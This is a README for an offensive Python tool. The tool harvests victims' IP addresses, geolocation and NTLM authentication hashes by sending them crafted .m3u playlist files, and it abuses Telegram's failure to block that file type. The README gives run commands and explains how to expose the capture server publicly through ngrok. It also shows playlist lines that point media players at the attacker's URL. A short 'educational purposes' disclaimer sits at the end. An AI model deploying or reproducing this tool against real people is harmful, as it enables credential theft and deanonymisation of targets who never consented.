# IP and NTLM Hash Detection Tool

A Python-based tool designed to capture IP addresses and NTLM authentication hashes from remote Windows clients using M3U files, primarily for security testing and educational purposes. This tool exploits the lack of blocking for the `.m3u` file extension in Telegram.

![m3u](https://github.com/user-attachments/assets/7051d51e-dee0-4304-9c3d-fd14c71f2e49)

## Demonstration

https://github.com/user-attachments/assets/ebd69f77-2ef5-4016-95da-8ee2749f7c25

## Overview

This tool sets up an HTTP server that:

- Logs client IP addresses and connection details.
- Attempts to capture NTLM authentication hashes when clients connect.
- Uses client-side JavaScript to detect and report public IP addresses.
- Generates `.m3u` files to trigger connections via media players.

## Features

- **IP Address Logging**: Records client IP addresses, ports, and connection details.
- **NTLM Hash Capture**: Requests and logs NTLM authentication hashes.
- **Public IP Detection**: Detects and reports clients' real public IP addresses using JavaScript.
- **Geolocation**: Identifies the geographic location of captured IP addresses.
- **Network Diagnostics**: Performs connectivity tests to ensure server accessibility.
- **Alternative Port Support**: Automatically tries alternative ports if the primary port is unavailable.

## Prerequisites

- Python 3.6 or higher
- Internet connectivity
- Open port access (may require firewall/router configuration)

## Installation

1. Clone the repository or download the script:

   ```bash
   git clone https://github.com/<your-repo>/ip-ntlm-hash-tool.git
   ```

2. Install required dependencies:

   ```bash
   pip install -r requirements.txt
   ```

## Usage

### Basic Usage

Run the script with default settings (port 8001, auto-detected IP):

```bash
python ipntlmhash.py
```

### Advanced Usage

Specify a custom IP address and port:

```bash
python ipntlmhash.py --ip 192.168.1.100 --port 8080
```

Try alternative ports if the primary port fails:

```bash
python ipntlmhash.py --alt-ports
```

### Command-line Options

| Option | Description | Default |
| --- | --- | --- |
| `--ip` | Specify the server IP address | Auto-detected |
| `--port` | Specify the port to listen on | 8001 |
| `--alt-ports` | Try alternative ports (80, 443, 8080, 8000) if primary fails | Disabled |

## Using with Ngrok (Recommended)

For public accessibility, especially behind NAT or firewalls, use ngrok:

1. Start the script:

   ```bash
   python ipntlmhash.py
   ```

2. In a separate terminal, start ngrok:

   ```bash
   ngrok http 8001
   ```

3. Ngrok will provide a public URL (e.g., `https://a1b2c3d4.ngrok.io`).

4. Edit the generated `.m3u` files to use the ngrok URL:

   - `ntlmv2_hash.m3u`:

     ```
     https://a1b2c3d4.ngrok.io/somefile.mp3
     ```

   - `ip_detect.m3u`:

     ```
     https://a1b2c3d4.ngrok.io/ip
     ```

## How It Works

1. The server listens for incoming connections on the specified port.
2. Upon client connection, it logs the IP address, port, and geolocation.
3. The server attempts NTLM authentication to capture hash data.
4. The `/ip` endpoint serves a JavaScript-based page to detect the client's public IP.
5. Clients report their public IP back to the server.
6. Generated `.m3u` files trigger connections when opened in media players.

## Output Files

- `ip_log.txt`: Logs of client connections and reported public IPs.
- `ntlm_log.txt`: Captured NTLM authentication data.
- `ipltlmhash.m3u`: Triggers both IP and NTLM hash capture.
- `ip_detect.m3u`: Directs clients to the IP detection page.

## Limitations

- NTLM hash capture depends on the client attempting NTLM authentication.
- Server accessibility requires proper network/firewall configuration.
- The tool captures NTLM hash data but does not fully process the handshake.
- Public IP detection requires JavaScript enabled in the client's browser.

## Security Note

This tool is intended for **educational purposes and authorized security testing only**. Unauthorized use against systems without permission may violate laws and regulations. Use responsibly and ethically.

## Troubleshooting

If you encounter connectivity issues:

- Ensure your firewall allows incoming connections on the server port.
- Set up port forwarding on your router if behind NAT.
- Use ngrok for reliable public access.
- Check the "Network Configuration Check" and "Server Accessibility Test" in the tool's output.
